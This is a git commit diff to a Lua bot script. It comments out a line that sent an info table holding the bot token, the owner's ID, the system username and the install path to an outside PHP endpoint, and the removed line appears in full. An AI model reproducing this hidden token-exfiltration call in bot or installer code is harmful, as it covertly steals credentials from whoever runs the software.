a1e6b973bc828faec6fd07ada0b0fa1dda480600
ahmedyad200 <78634692+ahmedyad200@users.noreply.github.com>
2021-04-21 05:19:49 +0200

    Add files via upload

--- inc/Run.lua
+++ inc/Run.lua
@@ -105,7 +105,7 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://sa3ed.tk/B_aaaa.php?Info='..JSON.encode(info))
+--https.request('https://sa3ed.tk/B_aaaa.php?Info='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
